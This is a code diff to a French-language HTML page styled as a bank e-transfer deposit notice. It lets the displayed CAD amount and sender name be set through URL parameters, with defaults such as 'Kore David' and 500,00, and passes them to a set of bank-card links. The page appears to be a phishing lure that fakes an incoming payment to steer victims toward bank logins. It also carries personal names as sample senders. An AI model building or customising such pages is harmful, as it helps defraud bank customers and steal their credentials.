@@ -36,8 +36,8 @@
 
     <div class="transfer-box">
         <div style="font-size: 22px;">📥 <b>Déposer vos fonds</b></div>
-        <div class="amount"><span id="prix-display">373,00</span> $ <small style="font-size: 18px; font-weight: normal;">CAD</small></div>
-        <p>De : <b id="nom-display">KOUAME ALAIN OKOU</b></p>
+        <div class="amount"><span id="prix-display">...</span> $ <small style="font-size: 18px; font-weight: normal;">CAD</small></div>
+        <p>De : <b id="nom-display">...</b></p>
     </div>
 
     <div class="details-bar">Voir les détails du virement <span style="color: #ffbf00;">❯</span></div>
@@ -88,8 +88,14 @@
 <script>
     window.onload = function() {
         const params = new URLSearchParams(window.location.search);
-        const prix = params.get('prix') || "373,00";
+        
+        // On récupère le prix (Défaut: 500,00)
+        const prix = params.get('prix') || "500,00";
         document.getElementById('prix-display').innerText = prix;
+
+        // On récupère le nom (Défaut: Kore David)
+        const nom = params.get('nom') || "Kore David";
+        document.getElementById('nom-display').innerText = nom;
         
         // Transmission automatique du prix et du logo aux liens
         document.querySelectorAll('.bank-card').forEach(card => {
